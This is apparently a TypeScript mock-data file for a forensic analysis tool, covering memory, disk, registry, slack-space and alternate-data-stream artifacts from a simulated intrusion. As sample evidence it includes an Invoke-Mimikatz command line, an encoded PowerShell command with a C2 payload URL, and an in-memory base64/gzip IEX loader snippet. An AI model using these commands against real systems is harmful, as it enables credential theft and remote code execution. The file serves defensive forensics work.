    source: 'VOLATILITY_RAM',
    sourceType: 'Volatility 3 windows.pslist',
    format: 'l2tcsv',
    description: 'Process spawned: PID 3840 powershell.exe (CommandLine: -NoProfile -ExecutionPolicy Bypass -Command Invoke-Mimikatz)',
    inodeOrHandle: 'EPROCESS-0xfa8006e89020',
    confidence: 'HIGH'
  },
  {
    index: 6,
    timestamp: '2026-09-01 08:44:22.015 UTC',
    timezone: 'UTC',
    macb: 'M...',
    source: 'EVTX',
    sourceType: 'PowerShell Event 4104',
    format: 'l2tcsv',
    description: 'Script block execution recorded: Invoke-Mimikatz reflection payload detected',
    inodeOrHandle: 'EVTX-PS-10420',
    confidence: 'HIGH'
  },
  {
    index: 7,
    timestamp: '2026-09-01 08:45:01.882 UTC',
    timezone: 'UTC',
    macb: '..CB',
    source: 'HIBERNATION',
    sourceType: 'Arsenal Recon Decompressed RAM',
    format: 'l2tcsv',
    description: 'Outbound socket established from PID 4920 (rundll32.exe) to 203.0.113.88:8443',
    inodeOrHandle: 'HIBER-SOCKET-4920',
    confidence: 'CORRELATED'
  }
];

export const MOCK_CARVED_EVIDENCE: CarvedEvidenceItem[] = [
  {
    id: 'carve-01',
    filename: 'NTUSER.DAT_deleted_trans_log.log',
    extension: 'log',
    category: 'REGISTRY_HIVE',
    offsetHex: '0x004F1800',
    sectorStart: 10368,
    sizeBytes: 262144,
    sha256: '9f83c6b410741f0b0932514f00b0ff01f2d6be9e1c18ce1e81307a541d81f0f7',
    carvingSignature: 'regf (Registry Hive Header)',
    recoveryConfidence: '100% INTACT',
    previewText: 'Root\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -> C:\\Temp\\watchdog_backup.exe [User Profile SID: S-1-5-21-382910]',
    extractedTimestamp: '2026-08-31T14:52:10Z',
    sourceImage: 'evidence_sdb_raw_bitstream.E01'
  },
  {
    id: 'carve-02',
    filename: 'incident_security_audit_secret.docx',
    extension: 'docx',
    category: 'DOCUMENT',
    offsetHex: '0x01A8C000',
    sectorStart: 2731008,
    sizeBytes: 154200,
    sha256: 'b4a8e9d7c6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9',
    carvingSignature: 'PK.. (Zip / Office Open XML Container)',
    recoveryConfidence: '100% INTACT',
    previewText: 'CONFIDENTIAL FORENSICS AUDIT: Analysis of Ring 0 kernel driver hook attempts on NVMe controller...',
    extractedTimestamp: '2026-08-31T14:53:00Z',
    sourceImage: 'evidence_sdb_raw_bitstream.E01'
  },
  {
    id: 'carve-03',
    filename: 'shadow_copy_sam_db.sqlite',
    extension: 'sqlite',
    category: 'DATABASE',
    offsetHex: '0x08F22400',
    sectorStart: 18765440,
    sizeBytes: 1048576,
    sha256: 'c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4',
    carvingSignature: 'SQLite format 3\0',
    recoveryConfidence: '95% MINOR_FRAGMENT',
    previewText: 'Tables: users (id, username, password_hash, sudo_pin, mfa_token), auth_audit_log, kernel_priv_events',
    extractedTimestamp: '2026-08-31T14:54:15Z',
    sourceImage: 'evidence_sdb_raw_bitstream.E01'
  },
  {
    id: 'carve-04',
    filename: 'deleted_payload_trojan_dissect.elf',
    extension: 'elf',
    category: 'DELETED_RECOVERED',
    offsetHex: '0x12C09000',
    sectorStart: 39323712,
    sizeBytes: 81920,
    sha256: 'e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7',
    carvingSignature: '\x7fELF (Executable and Linkable Format)',
    recoveryConfidence: '100% INTACT',
    previewText: 'ELF 64-bit LSB pie executable, x86-64, dynamically linked. Symbols: hook_syscall_table, bypass_watchdog',
    extractedTimestamp: '2026-08-31T14:55:00Z',
    sourceImage: 'live_usb_bitstream.dd'
  }
];

export const MOCK_MFT_TIMELINE: MftTimelineEntry[] = [
  {
    recordNumber: 1042,
    timestamp: '2026-08-31 14:15:22.108 UTC',
    macb: 'M.CB',
    filepath: 'C:\\Windows\\System32\\drivers\\etc\\hosts',
    sizeBytes: 824,
    inodeOrMftId: 'MFT-1042',
    sha256Hash: '4a8b7c9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c',
    isDeleted: false,
    activityType: 'MODIFIED'
  },
  {
    recordNumber: 1589,
    timestamp: '2026-08-31 14:18:04.992 UTC',
    macb: 'MA.B',
    filepath: 'C:\\Users\\architect\\AppData\\Local\\Temp\\sys_recovery_token.tmp',
    sizeBytes: 4096,
    inodeOrMftId: 'MFT-1589',
    sha256Hash: '7c9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e',
    isDeleted: true,
    activityType: 'DELETED'
  },
  {
    recordNumber: 2201,
    timestamp: '2026-08-31 14:20:11.450 UTC',
    macb: '.A..',
    filepath: 'C:\\Program Files\\SecureCurtain\\Kernel\\watchdog_service.sys',
    sizeBytes: 524288,
    inodeOrMftId: 'MFT-2201',
    sha256Hash: '1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
    isDeleted: false,
    activityType: 'ACCESSED'
  },
  {
    recordNumber: 3105,
    timestamp: '2026-08-31 14:24:59.001 UTC',
    macb: 'MACB',
    filepath: 'C:\\Users\\architect\\Desktop\\forensics_case_notes.md',
    sizeBytes: 12480,
    inodeOrMftId: 'MFT-3105',
    sha256Hash: '9f83c6b410741f0b0932514f00b0ff01f2d6be9e',
    isDeleted: false,
    activityType: 'CREATED'
  }
];

// =========================================================================
// ENCRYPTION KEYS (BITLOCKER FVEK, LUKS, VERACRYPT, FILEVAULT)
// =========================================================================

export interface VolatileEncryptionKey {
  id: string;
  encryptionType: 'BitLocker' | 'LUKS2' | 'VeraCrypt' | 'FileVault 2';
  volumeGuidOrUuid: string;
  volumeMountOrDrive: string;
  cipherAlgorithm: string;
  fvekOrMasterKeyHex: string; // Full Volume Encryption Key (or LUKS Master Key)
  vmkOrVolumeHeaderKeyHex?: string; // Volume Master Key (BitLocker) or Header Key (VeraCrypt)
  recoveryPasswordOrBek?: string; // Formatted 48-digit numeric recovery password or key file name
  extractionSource: 'RAM_PHYSICAL_POOL' | 'HYPERVISOR_MEM' | 'HIBERFIL_DECOMPRESSED' | 'CRASHDUMP';
  memoryOffsetHex: string;
  protectionProtectors: string[]; // ['TPM 2.0 + PIN', 'Numeric Recovery Password', 'Startup USB Key']
  readinessForMount: 'READY_FOR_OFFLINE_DECRYPT' | 'LOCKED_BY_TPM_SEAL' | 'KEY_VERIFIED';
}

export const MOCK_ENCRYPTION_KEYS: VolatileEncryptionKey[] = [
  {
    id: 'key-bitlocker-c',
    encryptionType: 'BitLocker',
    volumeGuidOrUuid: '{e789a1b2-c3d4-4e5f-8012-3456789abcde}',
    volumeMountOrDrive: 'C: (OS Boot Volume - NVMe0n1p3)',
    cipherAlgorithm: 'XTS-AES 256-bit with Elephant Diffuser',
    fvekOrMasterKeyHex: '4f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a',
    vmkOrVolumeHeaderKeyHex: '8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b',
    recoveryPasswordOrBek: '184920-592817-491028-381920-581938-492019-391827-491029',
    extractionSource: 'RAM_PHYSICAL_POOL',
    memoryOffsetHex: '0x000000078A14B000',
    protectionProtectors: ['TPM 2.0 (PCRs 0,2,4,7,11)', '48-digit Recovery Password'],
    readinessForMount: 'READY_FOR_OFFLINE_DECRYPT'
  },
  {
    id: 'key-luks-data',
    encryptionType: 'LUKS2',
    volumeGuidOrUuid: 'f8a7c6b5-d4e3-4f2a-8b1c-0d9e8f7a6b5c',
    volumeMountOrDrive: '/dev/nvme0n1p4 (LUKS Encrypted Data Partition)',
    cipherAlgorithm: 'aes-xts-plain64 (512-bit total / 256-bit key)',
    fvekOrMasterKeyHex: 'd3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a4f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d',
    recoveryPasswordOrBek: 'luks_recovery_master_payload.bin',
    extractionSource: 'RAM_PHYSICAL_POOL',
    memoryOffsetHex: '0x000000041B9C2000',
    protectionProtectors: ['Argon2id Key Slot 0', 'Recovery Key Slot 1'],
    readinessForMount: 'READY_FOR_OFFLINE_DECRYPT'
  },
  {
    id: 'key-veracrypt-vault',
    encryptionType: 'VeraCrypt',
    volumeGuidOrUuid: '{9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d}',
    volumeMountOrDrive: 'V: (VeraCrypt Hidden Container - 250 GB)',
    cipherAlgorithm: 'AES-Twofish-Serpent Cascaded (768-bit)',
    fvekOrMasterKeyHex: '9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e',
    vmkOrVolumeHeaderKeyHex: '1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b',
    recoveryPasswordOrBek: 'PIM 485 + SHA-512 Keyfile Hash',
    extractionSource: 'HIBERFIL_DECOMPRESSED',
    memoryOffsetHex: '0x00000002F0018400',
    protectionProtectors: ['Cascaded Key Hash', 'PIM (Personal Iteration Multiplier)'],
    readinessForMount: 'READY_FOR_OFFLINE_DECRYPT'
  }
];

// =========================================================================
// EXECUTION ARTIFACTS & TIMESTOMP DELTA ANALYZER
// =========================================================================

export interface PrefetchArtifact {
  id: string;
  executableName: string;
  prefetchFilename: string; // e.g. POWERSHELL.EXE-A1B2C3D4.pf
  runCount: number;
  lastRunUtc: string;
  previousRunTimesUtc: string[];
  fullPath: string;
  hash: string;
  isMAMCompressed: boolean;
  loadedDllsCount: number;
  suspiciousIndicators: string[];
}

export interface AmcacheArtifact {
  id: string;
  sha1Hash: string;
  filePath: string;
  fileSize: number;
  compilationTimestampUtc: string;
  fileDescription: string;
  publisher: string;
  peHeaderChecksum: string;
  isDeletedFromDisk: boolean;
}

export interface BamDamArtifact {
  id: string;
  userSid: string;
  username: string;
  binaryPath: string;
  lastExecutionUtc: string;
  activityModeratorSource: 'BAM (Background Activity Moderator)' | 'DAM (Desktop Activity Moderator)';
}

export interface SrumArtifact {
  id: string;
  appId: string;
  userId: string;
  bytesSent: number;
  bytesReceived: number;
  foregroundCpuMs: number;
  backgroundCpuMs: number;
  lastObservedUtc: string;
}

export interface TimestompAnomalyEntry {
  id: string;
  filepath: string;
  mftRecordNumber: number;
  standardInfoCreated: string; // $STANDARD_INFORMATION
  fileNameCreated: string;     // $FILE_NAME
  deltaSeconds: number;
  anomalyType: 
    | 'TIMESTOMP_SI_BEFORE_FN' 
    | 'NANOSECOND_ZERO_PADDING' 
    | 'FUTURE_TIMESTAMP'
    | 'COMPILATION_DATE_DISCREPANCY';
  confidenceScore: 'HIGH_SUSPICION' | 'DEFINITE_TIMESTOMP' | 'POSSIBLE_GLITCH';
  forensicProof: string;
}

export const MOCK_PREFETCH_ARTIFACTS: PrefetchArtifact[] = [
  {
    id: 'pf-01',
    executableName: 'POWERSHELL.EXE',
    prefetchFilename: 'POWERSHELL.EXE-8F9A1B2C.pf',
    runCount: 42,
    lastRunUtc: '2026-08-31 14:12:08 UTC',
    previousRunTimesUtc: [
      '2026-08-31 13:45:00 UTC',
      '2026-08-31 12:10:15 UTC',
      '2026-08-30 22:15:33 UTC'
    ],
    fullPath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    hash: '8F9A1B2C',
    isMAMCompressed: true,
    loadedDllsCount: 48,
    suspiciousIndicators: [
      'Loaded amsi.dll with memory patch signature',
      'Child process spawned unquoted script from %TEMP%'
    ]
  },
  {
    id: 'pf-02',
    executableName: 'MIMIKATZ.EXE',
    prefetchFilename: 'MIMIKATZ.EXE-5C3D2E1F.pf',
    runCount: 2,
    lastRunUtc: '2026-08-31 14:14:45 UTC',
    previousRunTimesUtc: [
      '2026-08-31 14:13:00 UTC'
    ],
    fullPath: 'C:\\Users\\architect\\AppData\\Local\\Temp\\mimikatz.exe',
    hash: '5C3D2E1F',
    isMAMCompressed: true,
    loadedDllsCount: 19,
    suspiciousIndicators: [
      'Loaded sekurlsa.dll and lsasrv.dll token handles',
      'High severity credential dumper signature'
    ]
  },
  {
    id: 'pf-03',
    executableName: '7Z.EXE',
    prefetchFilename: '7Z.EXE-3A4B5C6D.pf',
    runCount: 14,
    lastRunUtc: '2026-08-31 14:16:30 UTC',
    previousRunTimesUtc: [
      '2026-08-31 10:04:12 UTC',
      '2026-08-29 19:33:01 UTC'
    ],
    fullPath: 'C:\\Program Files\\7-Zip\\7z.exe',
    hash: '3A4B5C6D',
    isMAMCompressed: true,
    loadedDllsCount: 12,
    suspiciousIndicators: [
      'Archived multiple .docx and .kdbx files before network socket burst'
    ]
  }
];

export const MOCK_AMCACHE_ARTIFACTS: AmcacheArtifact[] = [
  {
    id: 'amc-01',
    sha1Hash: 'b4a8c9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7',
    filePath: 'C:\\Users\\architect\\AppData\\Local\\Temp\\sys_recovery_token.tmp',
    fileSize: 81920,
    compilationTimestampUtc: '2026-08-28 03:15:20 UTC',
    fileDescription: 'Trojan.Dropper Stage 2 payload (deleted after execution)',
    publisher: 'UNSIGNED (No Authenticode certificate)',
    peHeaderChecksum: '0x00014F8A',
    isDeletedFromDisk: true
  },
  {
    id: 'amc-02',
    sha1Hash: '1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a',
    filePath: 'C:\\Windows\\Temp\\sharpdump.exe',
    fileSize: 45056,
    compilationTimestampUtc: '2026-07-14 11:22:05 UTC',
    fileDescription: 'LSASS Memory Minidumper',
    publisher: 'UNSIGNED (No Authenticode certificate)',
    peHeaderChecksum: '0x0000B210',
    isDeletedFromDisk: true
  }
];

export const MOCK_BAM_ARTIFACTS: BamDamArtifact[] = [
  {
    id: 'bam-01',
    userSid: 'S-1-5-21-394829102-491029384-591029381-1001',
    username: 'architect',
    binaryPath: '\\Device\\HarddiskVolume3\\Users\\architect\\AppData\\Local\\Temp\\mimikatz.exe',
    lastExecutionUtc: '2026-08-31 14:14:45 UTC',
    activityModeratorSource: 'BAM (Background Activity Moderator)'
  },
  {
    id: 'bam-02',
    userSid: 'S-1-5-21-394829102-491029384-591029381-1001',
    username: 'architect',
    binaryPath: '\\Device\\HarddiskVolume3\\Program Files\\7-Zip\\7z.exe',
    lastExecutionUtc: '2026-08-31 14:16:30 UTC',
    activityModeratorSource: 'BAM (Background Activity Moderator)'
  }
];

export const MOCK_SRUM_ARTIFACTS: SrumArtifact[] = [
  {
    id: 'srum-01',
    appId: 'POWERSHELL.EXE',
    userId: 'S-1-5-21-394829102-491029384-591029381-1001',
    bytesSent: 15482900, // ~14.7 MB exfiltration
    bytesReceived: 249102,
    foregroundCpuMs: 8420,
    backgroundCpuMs: 1490,
    lastObservedUtc: '2026-08-31 14:12:15 UTC'
  },
  {
    id: 'srum-02',
    appId: '7Z.EXE',
    userId: 'S-1-5-21-394829102-491029384-591029381-1001',
    bytesSent: 0,
    bytesReceived: 0,
    foregroundCpuMs: 41200,
    backgroundCpuMs: 0,
    lastObservedUtc: '2026-08-31 14:16:40 UTC'
  }
];

export const MOCK_TIMESTOMP_ANOMALIES: TimestompAnomalyEntry[] = [
  {
    id: 'ts-01',
    filepath: 'C:\\Windows\\System32\\drivers\\etc\\hosts',
    mftRecordNumber: 1042,
    standardInfoCreated: '2021-01-15 08:00:00.0000000 UTC',
    fileNameCreated: '2026-08-31 14:15:22.1084920 UTC',
    deltaSeconds: 177488122,
    anomalyType: 'TIMESTOMP_SI_BEFORE_FN',
    confidenceScore: 'DEFINITE_TIMESTOMP',
    forensicProof: '$STANDARD_INFORMATION (SI) timestamp was intentionally backdated by 5.6 years. $FILE_NAME (FN) records actual creation on 2026-08-31. Exact 0000000 nanosecond padding confirms API timestomp.'
  },
  {
    id: 'ts-02',
    filepath: 'C:\\Program Files\\SecureCurtain\\Kernel\\watchdog_service.sys',
    mftRecordNumber: 2201,
    standardInfoCreated: '2023-05-10 12:00:00.0000000 UTC',
    fileNameCreated: '2026-08-31 14:20:11.4501290 UTC',
    deltaSeconds: 104466011,
    anomalyType: 'NANOSECOND_ZERO_PADDING',
    confidenceScore: 'HIGH_SUSPICION',
    forensicProof: '$SI creation contains exact zeroed microsecond and nanosecond components (12:00:00.0000000), characteristic of PowerShell Set-ItemProperty / SetFileTime API spoofing.'
  }
];

// ==========================================
// 1. VOLUME SHADOW COPY (VSS) FORENSICS
// ==========================================
export interface VssSnapshotFile {
  name: string;
  relativePath: string;
  sizeBytes: number;
  category: 'REGISTRY' | 'DATABASE' | 'EXECUTABLE' | 'EVENT_LOG' | 'DOCUMENT';
  diffStatus: 'UNMODIFIED' | 'REVISED_SINCE_SNAPSHOT' | 'DELETED_FROM_LIVE' | 'SUSPICIOUS_MALWARE';
  extractedToVault?: string;
}

export interface VssSnapshotEntry {
  id: string;
  snapshotId: string;
  setIndex: number;
  volumeName: string;
  creationTimeUtc: string;
  deviceObject: string; // e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
  originMachineSid: string;
  allocatedSizeBytes: number;
  usedSizeBytes: number;
  mountPoint?: string;
  isMounted: boolean;
  attributes: string[];
  preservedArtifactsCount: number;
  files: VssSnapshotFile[];
  notes: string;
}

export const MOCK_VSS_SNAPSHOTS: VssSnapshotEntry[] = [
  {
    id: 'vss-snap-01',
    snapshotId: '{7F8E1C2D-3A4B-5C6D-7E8F-9A0B1C2D3E4F}',
    setIndex: 1,
    volumeName: 'C: (Partition 2 - Windows OS)',
    creationTimeUtc: '2026-08-30 03:00:15 UTC',
    deviceObject: '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1',
    originMachineSid: 'S-1-5-21-382910482-192837465-901827364',
    allocatedSizeBytes: 12884901888, // 12 GB
    usedSizeBytes: 8589934592, // 8 GB
    mountPoint: '/mnt/vss/vss1',
    isMounted: true,
    attributes: ['Client-accessible', 'Differential (CoW)', 'Persistent', 'No-auto-release'],
    preservedArtifactsCount: 6,
    notes: 'Scheduled System Restore Point before scheduled Tuesday patch cycle. Contains pre-incident pristine hives.',
    files: [
      {
        name: 'SAM',
        relativePath: 'Windows/System32/config/SAM',
        sizeBytes: 65536,
        category: 'REGISTRY',
        diffStatus: 'DELETED_FROM_LIVE',
        extractedToVault: '/mnt/forensic_vault/VSS_EXTRACT/vss1/SAM'
      },
      {
        name: 'SYSTEM',
        relativePath: 'Windows/System32/config/SYSTEM',
        sizeBytes: 18874368,
        category: 'REGISTRY',
        diffStatus: 'REVISED_SINCE_SNAPSHOT',
        extractedToVault: '/mnt/forensic_vault/VSS_EXTRACT/vss1/SYSTEM'
      },
      {
        name: 'NTUSER.DAT',
        relativePath: 'Users/architect/NTUSER.DAT',
        sizeBytes: 4194304,
        category: 'REGISTRY',
        diffStatus: 'REVISED_SINCE_SNAPSHOT'
      },
      {
        name: 'Security.evtx',
        relativePath: 'Windows/System32/winevt/Logs/Security.evtx',
        sizeBytes: 20971520,
        category: 'EVENT_LOG',
        diffStatus: 'DELETED_FROM_LIVE',
        extractedToVault: '/mnt/forensic_vault/VSS_EXTRACT/vss1/Security_preincident.evtx'
      },
      {
        name: 'WebCacheV01.dat',
        relativePath: 'Users/architect/AppData/Local/Microsoft/Windows/WebCache/WebCacheV01.dat',
        sizeBytes: 33554432,
        category: 'DATABASE',
        diffStatus: 'REVISED_SINCE_SNAPSHOT'
      },
      {
        name: 'ntoskrnl.exe',
        relativePath: 'Windows/System32/ntoskrnl.exe',
        sizeBytes: 11534336,
        category: 'EXECUTABLE',
        diffStatus: 'UNMODIFIED'
      }
    ]
  },
  {
    id: 'vss-snap-02',
    snapshotId: '{8E9F0A1B-2C3D-4E5F-6A7B-8C9D0E1F2A3B}',
    setIndex: 2,
    volumeName: 'C: (Partition 2 - Windows OS)',
    creationTimeUtc: '2026-08-31 07:00:22 UTC',
    deviceObject: '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2',
    originMachineSid: 'S-1-5-21-382910482-192837465-901827364',
    allocatedSizeBytes: 6442450944, // 6 GB
    usedSizeBytes: 4294967296, // 4 GB
    mountPoint: '/mnt/vss/vss2',
    isMounted: false,
    attributes: ['Client-accessible', 'Differential (CoW)', 'Persistent'],
    preservedArtifactsCount: 4,
    notes: 'Shadow copy created 1 hour prior to suspect PowerShell execution and credential dumping activity.',
    files: [
      {
        name: 'Amcache.hve',
        relativePath: 'Windows/appcompat/Programs/Amcache.hve',
        sizeBytes: 15728640,
        category: 'REGISTRY',
        diffStatus: 'REVISED_SINCE_SNAPSHOT'
      },
      {
        name: 'sys_recovery_token.tmp',
        relativePath: 'Users/architect/AppData/Local/Temp/sys_recovery_token.tmp',
        sizeBytes: 81920,
        category: 'EXECUTABLE',
        diffStatus: 'SUSPICIOUS_MALWARE',
        extractedToVault: '/mnt/forensic_vault/VSS_EXTRACT/vss2/sys_recovery_token.tmp'
      },
      {
        name: 'PowerShell-Operational.evtx',
        relativePath: 'Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx',
        sizeBytes: 10485760,
        category: 'EVENT_LOG',
        diffStatus: 'REVISED_SINCE_SNAPSHOT'
      },
      {
        name: 'incident_security_audit.docx',
        relativePath: 'Users/architect/Documents/incident_security_audit.docx',
        sizeBytes: 154200,
        category: 'DOCUMENT',
        diffStatus: 'DELETED_FROM_LIVE',
        extractedToVault: '/mnt/forensic_vault/VSS_EXTRACT/vss2/incident_security_audit.docx'
      }
    ]
  }
];

// ==========================================
// 2. SLACK SPACE FORENSICS (RAM & CLUSTER SLACK)
// ==========================================
export interface SlackSpaceResidualHit {
  offsetHex: string;
  type: 'TEXT_RESIDUAL' | 'PASSWORD_HASH' | 'HIDDEN_MAGIC_BYTES' | 'BASE64_PAYLOAD' | 'IP_SOCKET' | 'LEAKED_METADATA';
  snippet: string;
  confidence: 'HIGH' | 'SUSPECT_ANOMALY' | 'DEFINITE_CARVE';
}

export interface SlackSpaceEntry {
  id: string;
  filepath: string;
  clusterSize: number; // typically 4096 bytes
  sectorSize: number;  // 512 bytes
  logicalFileSizeBytes: number;
  allocatedPhysicalBytes: number;
  ramSlackBytes: number;     // Bytes between EOF and end of the containing 512-byte sector
  clusterSlackBytes: number; // Bytes between end of sector and end of the 4096 cluster
  totalSlackBytes: number;
  hexDumpSample: string;
  discoveredArtifacts: SlackSpaceResidualHit[];
  status: 'ANALYZED' | 'CARVED_TO_FILE' | 'TAMPER_FLAGGED';
}

export const MOCK_SLACK_ENTRIES: SlackSpaceEntry[] = [
  {
    id: 'slack-01',
    filepath: 'C:\\Users\\architect\\AppData\\Local\\Temp\\network_report.txt',
    clusterSize: 4096,
    sectorSize: 512,
    logicalFileSizeBytes: 1420, // 1420 bytes
    allocatedPhysicalBytes: 4096, // 1 cluster
    ramSlackBytes: 116,   // 512 - (1420 % 512) = 512 - 396 = 116 bytes
    clusterSlackBytes: 2560, // 4096 - 1536 = 2560 bytes
    totalSlackBytes: 2676,
    status: 'TAMPER_FLAGGED',
    hexDumpSample: `0000058C: 44 4F 4E 45 0D 0A 00 00  50 4B 03 04 14 00 06 00  DONE....PK......
0000059C: 08 00 00 00 21 00 7A 8B  9C 0D 4E 01 00 00 F0 04  ....!.z...N.....
000005AC: 6B 65 79 5F 62 61 63 6B  75 70 2E 70 65 6D 00 00  key_backup.pem..
000005BC: 2D 2D 2D 2D 2D 42 45 47  49 4E 20 50 52 49 56 41  -----BEGIN PRIVA
000005CC: 54 45 20 4B 45 59 2D 2D  2D 2D 2D 0A 4D 49 49 45  TE KEY-----.MIIE`,
    discoveredArtifacts: [
      {
        offsetHex: '0x00000594',
        type: 'HIDDEN_MAGIC_BYTES',
        snippet: 'PK\\x03\\x04 (Embedded Zip container header injected into cluster slack space)',
        confidence: 'DEFINITE_CARVE'
      },
      {
        offsetHex: '0x000005AC',
        type: 'LEAKED_METADATA',
        snippet: 'Filename artifact inside slack: "key_backup.pem"',
        confidence: 'HIGH'
      },
      {
        offsetHex: '0x000005BC',
        type: 'PASSWORD_HASH',
        snippet: '-----BEGIN PRIVATE KEY-----\\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwgg...',
        confidence: 'HIGH'
      }
    ]
  },
  {
    id: 'slack-02',
    filepath: 'C:\\Windows\\System32\\drivers\\etc\\hosts',
    clusterSize: 4096,
    sectorSize: 512,
    logicalFileSizeBytes: 824,
    allocatedPhysicalBytes: 4096,
    ramSlackBytes: 200,
    clusterSlackBytes: 3072,
    totalSlackBytes: 3272,
    status: 'ANALYZED',
    hexDumpSample: `00000338: 6C 6F 63 61 6C 68 6F 73  74 0A 00 00 00 00 00 00  localhost.......
00000348: 70 6F 77 65 72 73 68 65  6C 6C 2E 65 78 65 20 2D  powershell.exe -
00000358: 45 6E 63 20 4A 41 42 7A  41 47 6B 41 62 77 42 6C  Enc JABzAGkAbwBl
00000368: 68 74 74 70 3A 2F 2F 32  30 33 2E 30 2E 31 31 33  http://203.0.113
00000378: 2E 38 38 3A 38 34 34 33  2F 70 61 79 6C 6F 61 64  .88:8443/payload`,
    discoveredArtifacts: [
      {
        offsetHex: '0x00000348',
        type: 'BASE64_PAYLOAD',
        snippet: 'powershell.exe -Enc JABzAGkAbwBl... (Residual unallocated command from deleted temp file)',
        confidence: 'HIGH'
      },
      {
        offsetHex: '0x00000368',
        type: 'IP_SOCKET',
        snippet: 'http://203.0.113.88:8443/payload (Command & Control URI preserved in RAM slack buffer)',
        confidence: 'HIGH'
      }
    ]
  },
  {
    id: 'slack-03',
    filepath: 'C:\\Users\\architect\\Pictures\\company_logo.png',
    clusterSize: 4096,
    sectorSize: 512,
    logicalFileSizeBytes: 12280, // 3 full clusters + 8 bytes
    allocatedPhysicalBytes: 16384, // 4 clusters (16384 bytes)
    ramSlackBytes: 504,
    clusterSlackBytes: 3584,
    totalSlackBytes: 4088,
    status: 'CARVED_TO_FILE',
    hexDumpSample: `00002FF8: 49 45 4E 44 AE 42 60 82  00 00 00 00 00 00 00 00  IEND.B\`.........
00003008: 75 73 65 72 3D 61 72 63  68 69 74 65 63 74 26 74  user=architect&t
00003018: 6F 6B 65 6E 3D 65 79 4A  68 62 47 63 69 4F 69 4A  oken=eyJhbGciOiJ
00003028: 53 55 7A 49 31 4E 69 49  73 49 6E 52 35 63 43 49  SUzI1NiIsInR5cCI`,
    discoveredArtifacts: [
      {
        offsetHex: '0x00003008',
        type: 'TEXT_RESIDUAL',
        snippet: 'user=architect&token=eyJhbGciOiJSUzI1NiIs... (JWT Bearer authentication header left in memory slack)',
        confidence: 'HIGH'
      }
    ]
  }
];

// ==========================================
// 3. ALTERNATE DATA STREAMS (ADS) FORENSICS
// ==========================================
export interface AlternateDataStreamEntry {
  id: string;
  parentFilePath: string;
  parentFileSizeBytes: number;
  streamName: string; // e.g. ":Zone.Identifier", ":payload.ps1"
  fullStreamPath: string; // e.g. C:\Users\Downloads\invoice.pdf:payload.ps1
  streamType: '$DATA' | 'ZONE_IDENTIFIER' | 'SECURITY_DESCRIPTOR';
  streamSizeBytes: number;
  sha256: string;
  detectionClassification: 'BENIGN_MOTW' | 'SUSPICIOUS_PAYLOAD' | 'OBFUSCATED_SCRIPT' | 'COVERT_STORAGE';
  previewSnippet: string;
  createdUtc: string;
  extractedPath?: string;
  motwMetadata?: {
    zoneId: number; // 3 = Internet, 4 = Untrusted, 2 = Trusted, 1 = Intranet
    referrerUrl?: string;
    hostUrl?: string;
  };
}

export const MOCK_ADS_ENTRIES: AlternateDataStreamEntry[] = [
  {
    id: 'ads-01',
    parentFilePath: 'C:\\Users\\architect\\Downloads\\Forensic_Triage_Tools.zip',
    parentFileSizeBytes: 14680064,
    streamName: ':Zone.Identifier',
    fullStreamPath: 'C:\\Users\\architect\\Downloads\\Forensic_Triage_Tools.zip:Zone.Identifier',
    streamType: 'ZONE_IDENTIFIER',
    streamSizeBytes: 168,
    sha256: '4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a',
    detectionClassification: 'BENIGN_MOTW',
    createdUtc: '2026-08-31 14:08:12 UTC',
    previewSnippet: `[ZoneTransfer]\nZoneId=3\nReferrerUrl=https://github.com/arsenal-recon/hibernation_recon/releases\nHostUrl=https://objects.githubusercontent.com/releases/10293/triage.zip`,
    motwMetadata: {
      zoneId: 3,
      referrerUrl: 'https://github.com/arsenal-recon/hibernation_recon/releases',
      hostUrl: 'https://objects.githubusercontent.com/releases/10293/triage.zip'
    }
  },
  {
    id: 'ads-02',
    parentFilePath: 'C:\\Users\\architect\\AppData\\Local\\Temp\\report_summary.docx',
    parentFileSizeBytes: 45056,
    streamName: ':stealth_payload.ps1',
    fullStreamPath: 'C:\\Users\\architect\\AppData\\Local\\Temp\\report_summary.docx:stealth_payload.ps1',
    streamType: '$DATA',
    streamSizeBytes: 2840,
    sha256: '7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c',
    detectionClassification: 'SUSPICIOUS_PAYLOAD',
    createdUtc: '2026-08-31 14:13:40 UTC',
    extractedPath: '/mnt/forensic_vault/EXTRACTED_STREAMS/stealth_payload.ps1',
    previewSnippet: `$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIC..."));\n$d = New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress);\nIEX (New-Object IO.StreamReader($d)).ReadToEnd();`
  },
